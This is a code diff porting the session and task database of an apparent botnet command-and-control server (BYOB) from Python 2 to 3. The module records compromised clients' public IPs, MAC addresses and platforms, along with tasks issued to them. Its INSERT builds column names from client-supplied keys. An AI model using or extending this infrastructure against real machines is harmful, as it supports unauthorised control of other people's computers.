@@ -4,30 +4,34 @@
 
 # standard library
 import os
-import sys
-import md5
 import json
 import sqlite3
+import hashlib
 import datetime
 import collections
 
 # modules
 import util
 
+try:
+    unicode        # Python 2
+except NameError:
+    unicode = str  # Python 3
+
 class Database(sqlite3.Connection):
-    """ 
+    """
     Builds and manages a persistent Sqlite3 database for the
     sessions & tasks handled by byob.server.Server instances
 
     """
     _tbl_tasks = """BEGIN TRANSACTION;
 CREATE TABLE IF NOT EXISTS tbl_tasks (
-    id serial, 
-    uid varchar(32) NOT NULL, 
+    id serial,
+    uid varchar(32) NOT NULL,
     session varchar(32) NOT NULL,
-    task text DEFAULT NULL, 
-    result text DEFAULT NULL, 
-    issued DATETIME DEFAULT NULL, 
+    task text DEFAULT NULL,
+    result text DEFAULT NULL,
+    issued DATETIME DEFAULT NULL,
     completed DATETIME DEFAULT NULL
 );
 COMMIT;
@@ -53,7 +57,7 @@ COMMIT;
 """
 
     def __init__(self, database=':memory:'):
-        """ 
+        """
         Create new Sqlite3 Conection instance and setup the BYOB database
 
         `Optional`
@@ -81,31 +85,31 @@ COMMIT;
                         j = json.loads(v.encode())
                         self._display(j, indent+2)
                     except:
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
-                        util.display(str(v).encode().replace('\n',' ')[:40], color=c, style='dim')
+                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
+                        util.display(str(v).replace('\n',' ')[:40].encode(), color=c, style='dim')
 
                 elif isinstance(v, list):
                     for i in v:
                         if isinstance(v, dict):
-                            util.display(str(k).ljust(4  * indent).center(5 * indent))
+                            util.display(str(k).ljust(4  * indent).center(5 * indent).encode())
                             self._display(v, indent+2)
                         else:
-                            util.display(str(i).ljust(4  * indent).center(5 * indent))
+                            util.display(str(i).ljust(4  * indent).center(5 * indent).encode())
 
                 elif isinstance(v, dict):
-                    util.display(str(k).ljust(4  * indent).center(5 * indent))
+                    util.display(str(k).ljust(4  * indent).center(5 * indent).encode())
                     self._display(v, indent+1)
 
                 elif isinstance(v, int):
                     if v in (0,1):
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
+                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                         util.display(str(bool(v)).encode(), color=c, style='dim')
                     else:
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
+                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                         util.display(str(v).encode(), color=c, style='dim')
 
                 else:
-                    util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
+                    util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                     util.display(str(v).encode(), color=c, style='dim')
 
         elif isinstance(data, list):
@@ -113,7 +117,7 @@ COMMIT;
                 if isinstance(row, dict):
                     self._display(row, indent+2)
                 else:
-                    util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
+                    util.display(str(row).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                     util.display(str(v).encode(), color=c, style='dim')
         else:
             try:
@@ -125,11 +129,11 @@ COMMIT;
 
             if isinstance(data, dict):
                 i = data.pop('id',None)
-                util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
+                util.display(str(i).rjust(indent-1).encode(), color='reset', style='bright') if i else None
                 self._display(data, indent+2)
             else:
-                util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=','))
-                util.display(v.encode(), color=c, style='dim')
+                util.display(data.ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
+                util.display(str(v).encode(), color=c, style='dim')
 
     def _client_sessions(self, uid):
         for i in self.execute('select sessions from tbl_sessions where uid=:uid', {"uid": uid}):
@@ -144,26 +148,26 @@ COMMIT;
         return len(self.get_sessions(verbose=False))
 
     def debug(self, output):
-        """ 
+        """
         Print debugging output to console
         """
         util.log(str(output), level='debug')
 
     def error(self, output):
-        """ 
+        """
         Print error output to console
         """
         util.log(str(output), level='error')
 
     def exists(self, uid):
-        """ 
+        """
         Check if a client exists in the database
         """
         result = bool(len([_ for _ in self.execute("select * from tbl_sessions where uid=:uid", {"uid": uid})]))
         return result
 
     def update_status(self, session, online):
-        """ 
+        """
         Update session status to online/offline
 
         `Required`
@@ -183,10 +187,10 @@ COMMIT;
                 elif isinstance(session, int):
                     self.execute_query("UPDATE tbl_sessions SET online=0, last_online=:last_online WHERE id=:uid", params={"uid": session, "last_online": datetime.datetime.now()}, returns=False)
         except Exception as e:
-            self.error("{} error: {}".format(self.update_status.func_name, str(e)))
+            self.error("{} error: {}".format(self.update_status.__name__, str(e)))
 
     def get_sessions(self, verbose=False):
-        """ 
+        """
         Fetch sessions from database
 
         `Optional`
@@ -197,10 +201,10 @@ COMMIT;
         sql = "select * from tbl_sessions" if verbose else "select id, public_ip, uid, platform from tbl_sessions"
         statement = self.execute(sql)
         columns = [_[0] for _ in statement.description]
-        return [{k:v for k,v in zip(columns, rows)} for rows in statement.fetchall()]
+        return [{k:v for (k,v) in zip(columns, rows)} for rows in statement.fetchall()]
 
     def get_tasks(self):
-        """ 
+        """
         Fetch tasks from database
 
         `Optional`
@@ -215,7 +219,7 @@ COMMIT;
         return [{k:v for k,v in zip(columns, rows)} for rows in statement.fetchall()]
 
     def handle_session(self, info):
-        """ 
+        """
         Handle a new/current client by adding/updating database
 
         `Required`
@@ -226,7 +230,8 @@ COMMIT;
         if isinstance(info, dict):
 
             if not info.get('uid'):
-                info['uid'] = md5.new(info['public_ip'] + info['mac_address']).hexdigest()
+                buid = str(info['public_ip'] + info['mac_address']).encode()
+                info['uid'] = hashlib.md5(buid).hexdigest()
                 info['joined'] = datetime.datetime.now()
 
             info['online'] = 1
@@ -236,7 +241,7 @@ COMMIT;
             newclient = False
             if not self.exists(info['uid']):
                 newclient = True
-                self.execute_query("insert into tbl_sessions ({}) values (:{})".format(','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)                
+                self.execute_query("insert into tbl_sessions ({}) values (:{})".format(','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)
             else:
                 self.execute_query("update tbl_sessions set online=:online, sessions=:sessions, last_online=:last_online where uid=:uid", params=info, returns=False, display=False)
 
@@ -255,7 +260,7 @@ COMMIT;
             self.error("Error: invalid input type received from server (expected '{}', receieved '{}')".format(dict, type(info)))
 
     def handle_task(self, task):
-        """ 
+        """
         Adds issued tasks to the database and updates completed tasks with results
 
         `Task`
@@ -271,7 +276,8 @@ COMMIT;
         """
         if isinstance(task, dict):
             if 'uid' not in task:
-                task['uid'] = md5.new(task['session'] + task['task'] + datetime.datetime.now().ctime()).hexdigest()
+                buid = str(task['session'] + task['task'] + datetime.datetime.now().ctime()).encode()
+                task['uid'] = hashlib.md5(buid).hexdigest()
                 task['issued'] = datetime.datetime.now()
                 self.execute_query('insert into tbl_tasks (uid, session, task, issued) values (:uid, :session, :task, :issued)', params={"uid": task['uid'],  "session": task['session'], "task": task['task'], "issued": task['issued']}, returns=False)
                 task['issued'] = task['issued'].ctime()
@@ -285,10 +291,10 @@ COMMIT;
             return task
 
         else:
-            self.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
+            self.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.__name__, dict, type(task)))
 
     def execute_query(self, stmt, params={}, returns=True, display=False):
-        """ 
+        """
         Query the database with a SQL statement and return result
 
         `Required`
@@ -314,7 +320,7 @@ COMMIT;
             return result
 
     def execute_file(self, filename=None, sql=None, returns=True, display=False):
-        """ 
+        """
         Execute SQL commands sequentially from a string or file
 
         `Optional`
@@ -351,4 +357,4 @@ COMMIT;
                 return result
 
         except Exception as e:
-            self.error("{} error: {}".format(self.execute_file.func_name, str(e)))
+            self.error("{} error: {}".format(self.execute_file.__name__, str(e)))
